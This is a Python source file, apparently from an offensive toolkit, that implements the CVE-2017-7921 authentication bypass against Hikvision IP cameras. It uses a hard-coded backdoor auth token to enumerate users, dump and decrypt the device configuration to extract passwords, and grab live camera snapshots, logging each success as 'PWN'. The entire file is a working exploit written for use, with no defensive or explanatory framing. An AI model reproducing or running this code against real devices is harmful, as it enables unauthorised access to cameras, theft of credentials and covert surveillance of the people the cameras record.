import re
from engines.utils import log, get_session, get_target_dir
from engines.hikvision_decryptor import HikvisionDecryptor
from engines.hikvision_snapshots import HIKVISION_BACKDOOR_CREDS

class HikvisionExploiter:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = get_session()
        self.auth = "?auth=YWRtaW46MTEK"
        self.found_users = []
        self.found_passwords = [HIKVISION_BACKDOOR_CREDS[1]]

    def run_backdoor(self):
        log("Running Hikvision Backdoor Exploit (CVE-2017-7921)...")
        backdoor_ok = False
        ip = self.target_url.split("//")[1].split(":")[0].split("/")[0]
        t_dir = get_target_dir(ip)

        # 1. User Enumeration
        try:
            r = self.session.get(f"{self.target_url}/Security/users{self.auth}")
            if r.status_code == 200 and "userlist" in r.text.lower():
                backdoor_ok = True
                self.found_users = re.findall(r'<userName>(.*?)</userName>', r.text)
                log(f"Found Hikvision Users: {self.found_users}", "SUCCESS")
            elif r.status_code == 401:
                log("CVE-2017-7921 PATCHED — /Security/users returns 401", "WARNING")
        except Exception:
            pass

        if not self.found_users:
            self.found_users = [HIKVISION_BACKDOOR_CREDS[0]]

        # 2. Configuration Dump & Decrypt
        try:
            r = self.session.get(f"{self.target_url}/System/configurationFile{self.auth}")
            if r.status_code == 200 and len(r.content) > 200:
                backdoor_ok = True
                with open(f"{t_dir}/configurationFile", "wb") as f:
                    f.write(r.content)
                log(f"Configuration file dumped to {t_dir}!", "SUCCESS")
                for pw in HikvisionDecryptor.decrypt(r.content):
                    if pw not in self.found_passwords:
                        self.found_passwords.append(pw)
                        log(f"Extracted password from config: {pw}", "SUCCESS")
            elif r.status_code == 401:
                log("Config dump blocked (401) — use real password + Digest auth.", "WARNING")
        except Exception:
            pass

        # 3. Live Snapshot
        try:
            r = self.session.get(f"{self.target_url}/onvif-http/snapshot{self.auth}")
            if r.status_code == 200 and len(r.content) > 1000:
                backdoor_ok = True
                with open(f"{t_dir}/live_snapshot.jpg", "wb") as f:
                    f.write(r.content)
                log(f"Live camera snapshot saved to {t_dir}/live_snapshot.jpg", "PWN")
            elif r.status_code == 401:
                log("Backdoor snapshot blocked — need real credentials.", "WARNING")
        except Exception:
            pass

        if backdoor_ok:
            log(f"Backdoor ACTIVE: {self.found_users[0]}:{self.found_passwords[0]}", "PWN")
        else:
            log("Backdoor CLOSED on this firmware — hunting real password (Digest/ISAPI)...", "WARNING")
        self.backdoor_active = backdoor_ok
        return self.found_users, self.found_passwords
